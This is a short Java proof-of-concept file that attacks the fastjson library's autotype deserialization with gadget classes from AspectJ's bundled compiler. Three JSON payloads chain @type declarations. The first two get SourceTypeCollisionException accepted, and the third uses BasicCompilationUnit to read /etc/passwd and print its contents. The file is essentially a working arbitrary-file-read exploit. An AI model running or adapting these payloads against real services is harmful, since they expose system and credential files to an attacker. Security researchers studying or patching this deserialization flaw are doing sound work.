import com.alibaba.fastjson.JSON;

public class aspectj {
    private static String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
            "}";

    private static String poc2 = "{\n" +
            "    \"@type\":\"java.lang.Class\",\n" +
            "    \"val\":{\n" +
            "        \"@type\":\"java.lang.String\"{\n" +
            "        \"@type\":\"java.util.Locale\",\n" +
            "        \"val\":{\n" +
            "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
            "                \"@type\":\"java.lang.String\"\n" +
            "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
            "                \"newAnnotationProcessorUnits\":[{}]\n" +
            "            }\n" +
            "        }\n" +
            "    }";

    private static String poc3 = "{\n" +
            "    \"x\":{\n" +
            "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
            "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
            "        \"fileName\":\"/etc/passwd\"\n" +
            "    }\n" +
            "}";

    public static void main(String[] args) {
        JSON.parseObject(poc1);
        try {
            JSON.parseObject(poc2);
        } catch (Exception e){}
        System.out.println(JSON.parseObject(poc3));
    }

}
